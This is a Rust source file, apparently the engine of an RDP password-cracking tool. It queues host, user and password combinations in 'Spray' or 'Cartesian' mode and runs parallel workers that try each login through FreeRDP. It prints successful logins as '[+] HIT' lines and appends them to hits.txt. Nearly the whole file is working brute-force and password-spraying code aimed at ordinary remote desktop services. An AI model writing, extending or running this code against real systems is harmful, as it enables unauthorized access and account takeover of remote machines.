// src/engine.rs
use crate::auth::{AuthResult, FreeRdp};
use crate::GlobalState;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use crossbeam_channel::{bounded, Receiver, Sender};
use std::thread;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::Local;

#[derive(Clone)]
pub struct CrackJob {
    pub host: String,
    pub user: String,
    pub password: String,
}

pub struct CrackStats {
    pub tried: u64,
    pub hits: u64,
    pub errors: u64,
}

pub async fn run_crack(
    hosts: Vec<String>,
    users: Vec<String>,
    passwords: Vec<String>,
    domain: String,
    port: u16,
    timeout: u64,
    workers: usize,
    mode: CrackMode,
    stop_on_hit: bool,
    state: Arc<GlobalState>,
) -> CrackStats {
    let rt = tokio::runtime::Handle::current();
    let freerdp = match FreeRdp::find() {
        Some(f) => Arc::new(f),
        None => {
            eprintln!("[!] FreeRDP not found");
            return CrackStats { tried: 0, hits: 0, errors: 0 };
        }
    };

    let (tx, rx): (Sender<CrackJob>, Receiver<CrackJob>) = bounded(workers * 4);
    let hit_hosts = Arc::new(parking_lot::Mutex::new(std::collections::HashSet::<String>::new()));

    let mut handles = Vec::new();

    // Producer
    let producer_state = state.clone();
    let producer_hosts = hosts.clone();
    let producer_users = users.clone();
    let producer_passwords = passwords.clone();
    let producer_tx = tx.clone();

    let producer = thread::spawn(move || {
        match mode {
            CrackMode::Spray => {
                for password in &producer_passwords {
                    for host in &producer_hosts {
                        for user in &producer_users {
                            if producer_state.stop.load(Ordering::Relaxed) {
                                return;
                            }
                            let job = CrackJob {
                                host: host.clone(),
                                user: user.clone(),
                                password: password.clone(),
                            };
                            if producer_tx.send(job).is_err() {
                                return;
                            }
                        }
                    }
                }
            }
            CrackMode::Cartesian => {
                for host in &producer_hosts {
                    for user in &producer_users {
                        for password in &producer_passwords {
                            if producer_state.stop.load(Ordering::Relaxed) {
                                return;
                            }
                            let job = CrackJob {
                                host: host.clone(),
                                user: user.clone(),
                                password: password.clone(),
                            };
                            if producer_tx.send(job).is_err() {
                                return;
                            }
                        }
                    }
                }
            }
        }
        drop(producer_tx);
    });

    // Workers
    for _ in 0..workers {
        let rx = rx.clone();
        let freerdp = freerdp.clone();
        let state = state.clone();
        let hit_hosts = hit_hosts.clone();
        let domain = domain.clone();

        let handle = thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap();

            while let Ok(job) = rx.recv() {
                if state.stop.load(Ordering::Relaxed) {
                    break;
                }

                // Skip if host already hit
                if stop_on_hit {
                    if hit_hosts.lock().contains(&job.host) {
                        state.tried.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                }

                let result = rt.block_on(freerdp.try_auth(
                    &job.host,
                    &job.user,
                    &job.password,
                    &domain,
                    port,
                    timeout,
                ));

                state.tried.fetch_add(1, Ordering::Relaxed);

                match result {
                    AuthResult::Success => {
                        state.hits.fetch_add(1, Ordering::Relaxed);
                        hit_hosts.lock().insert(job.host.clone());
                        save_hit(&job.host, &job.user, &job.password);
                        println!("[+] HIT: {} {}:{}", job.host, job.user, job.password);
                    }
                    AuthResult::Network | AuthResult::Timeout => {
                        state.errors.fetch_add(1, Ordering::Relaxed);
                    }
                    _ => {}
                }
            }
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.join();
    }
    let _ = producer.join();

    CrackStats {
        tried: state.tried.load(Ordering::Relaxed),
        hits: state.hits.load(Ordering::Relaxed),
        errors: state.errors.load(Ordering::Relaxed),
    }
}

fn save_hit(host: &str, user: &str, password: &str) {
    let ts = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
    if let Ok(mut f) = OpenOptions::new()
        .create(true)
        .append(true)
        .open("hits.txt")
    {
        let _ = writeln!(f, "{} | {} | {}:{}", ts, host, user, password);
    }
}

#[derive(Clone, Copy)]
pub enum CrackMode {
    Spray,
    Cartesian,
}